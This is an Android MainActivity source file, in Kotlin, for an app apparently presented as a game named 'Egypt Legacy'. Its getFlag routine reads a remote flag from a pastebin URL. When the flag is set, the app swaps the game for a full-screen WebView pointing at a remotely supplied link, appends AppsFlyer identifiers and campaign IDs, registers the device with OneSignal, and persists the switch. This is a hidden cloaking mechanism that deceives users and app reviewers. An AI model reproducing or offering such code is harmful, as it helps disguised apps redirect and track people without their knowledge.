package nsl.radead.egyptlegacy

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintSet
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.onesignal.OneSignal
import nsl.radead.egyptlegacy.util.webView.WebViewFragment
import nsl.radead.egyptlegacy.databinding.ActivityMainBinding
import nsl.radead.egyptlegacy.util.Lottie
import nsl.radead.egyptlegacy.util.Once
import nsl.radead.egyptlegacy.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.collectIndexed
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import nsl.radead.egyptlegacy.util.AppsflyerUtil
import nsl.radead.egyptlegacy.util.DataStoreManager
import nsl.radead.egyptlegacy.util.internetConnection
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.io.IOException
import java.util.UUID
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val WEB_VIEW_ID = 1000

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
        var webURL              = "https://www.google.com/"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie          : Lottie

    val webViewFragment      = WebViewFragment(this)
    private val okHttpClient = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        asyncCheckInternetConnection()
        lottie.showLoader()

        coroutine.launch(Dispatchers.IO) {

//            startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
            checkDataStore()

            launch(Dispatchers.Main) {
                startFragmentIdFlow.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            binding.root.also { rootCL ->
                                ConstraintSet().apply {
                                    clone(rootCL)
                                    constrainPercentWidth(binding.loader.id, .2f)
                                }.applyTo(rootCL)
                            }

                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.background)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                        }
                        WEB_VIEW_ID -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment.onActivityResult(requestCode, resultCode, data)
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)

        webViewFragment.onCreate(coroutine, binding.webStage)

    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    private fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "WEB" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = WEB")
                        webURL = it
                        startFragmentIdFlow.emit(WEB_VIEW_ID)
                    }
                }
                "GAME" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentIdFlow.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getFlag()
                }
            }
        }
    }

    private suspend fun getFlag() {
        val request: Request = Request.Builder().url("https://pastebin.com/raw/1UyVQ4pk").build()

        try {
            okHttpClient.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val json = JSONObject(response.body?.string() ?: "")
                    log("getFlag SUCCESS: $json")

                    val flag    = json.getBoolean("fLag")
                    val key     = json.getString("fKey")
                    val privacy = json.getString("fLink")

                    if (flag) generateAndOpenLink(key, privacy) else {
                        startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                        withContext(Dispatchers.IO) { DataStoreManager.Key.update { "GAME" } }
                    }
                } else {
                    log("getFlag newCall FAIL: ${response.code} ${response.message}")
                    startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
                }
            }
        } catch (e: IOException) {
            log("getFlag FAIL: $e")
            startFragmentIdFlow.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun generateAndOpenLink(key: String, target: String) {
        coroutine.launch(Dispatchers.IO) {
            val completerFlow = MutableSharedFlow<Unit>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

            launch {
                AppsflyerUtil.initialize(this@MainActivity, key)
                AppsflyerUtil.checkFlow.collect { completerFlow.tryEmit(Unit) }
            }


            completerFlow.collectIndexed { index, _ ->
                if (index == 0) {

                    val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                    val fLink = target.plus("?") +
                        "sub1=".plus(AppsflyerUtil.campaignSubMap["sub1"].toString()).plus("&") +
                        "sub2=".plus(AppsflyerUtil.campaignSubMap["sub2"].toString()).plus("&") +
                        "sub3=".plus(AppsflyerUtil.campaignSubMap["sub3"].toString()).plus("&") +
                        "sub4=".plus(AppsflyerUtil.campaignSubMap["sub4"].toString()).plus("&") +
                        "sub5=".plus(AppsflyerUtil.campaignSubMap["sub5"].toString()).plus("&") +
                        "sub6=".plus(AppsflyerUtil.campaignSubMap["sub6"].toString()).plus("&") +
                        "subid="  .plus(appsflyerUID).plus("&") +
                        "adid="   .plus(AppsflyerUtil.dataMap["adset_id"]   .toString()).plus("&") +
                        "compid=" .plus(AppsflyerUtil.dataMap["campaign_id"].toString()).plus("&") +
                        "push_id=".plus(appsflyerUID)

                    log("fLink: $fLink")

                    OneSignal.login(appsflyerUID ?: UUID.randomUUID().toString())
                    OneSignal.User.addTag("sub_id_6", "install")
                    OneSignal.User.addTag("sub_id_2", AppsflyerUtil.campaignSubMap["sub2"].toString())

                    webURL = fLink
                    startFragmentIdFlow.tryEmit(WEB_VIEW_ID)

                    withContext(Dispatchers.IO) {
                        DataStoreManager.Key.update { "WEB" }
                        DataStoreManager.Link.update { fLink }
                    }
            } }
        }
    }
}